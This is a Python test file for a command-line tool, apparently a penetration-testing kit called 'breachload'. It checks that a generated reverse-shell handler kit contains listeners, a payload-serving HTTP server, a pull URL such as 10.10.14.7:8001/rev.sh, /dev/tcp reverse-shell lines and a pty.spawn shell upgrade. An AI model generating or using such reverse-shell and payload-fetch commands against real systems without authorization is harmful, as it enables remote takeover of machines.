"""Reverse-shell handler kit + the listen CLI command (print path)."""

from typer.testing import CliRunner

import breachload.cli as climod
from breachload.analysis.handler import build_kit, kit_lines

runner = CliRunner()


class TestBuildKit:
    def test_fills_lhost_lport(self):
        kit = build_kit("10.10.14.7", lport=9001, http_port=8001, payload="rev.sh")
        assert any("9001" in c for c in kit.listeners)
        assert "8001" in kit.http_server
        assert any("10.10.14.7:8001/rev.sh" in c for c in kit.pull)
        assert any("/dev/tcp/10.10.14.7/9001" in c for c in kit.reverse_shells)

    def test_has_all_sections(self):
        kit = build_kit()
        assert kit.listeners and kit.http_server and kit.pull
        assert kit.reverse_shells and kit.upgrade

    def test_kit_lines_are_sectioned(self):
        lines = kit_lines("10.10.14.7", 4444)
        assert any(ln.startswith("# 1)") for ln in lines)
        assert any("pty.spawn" in ln for ln in lines)


class TestListenCommand:
    def test_prints_kit(self, tmp_path, monkeypatch):
        monkeypatch.setattr(climod, "ENGAGEMENTS", tmp_path)
        cfg = tmp_path / "t.yaml"
        cfg.write_text("name: t\ntargets: ['10.10.10.5']\nlhost: 10.10.14.7\nlport: 9001\n",
                       encoding="utf-8")
        result = runner.invoke(climod.app, ["listen", str(cfg)])
        assert result.exit_code == 0, result.output
        assert "reverse-shell handler" in result.output
        assert "9001" in result.output and "10.10.14.7" in result.output
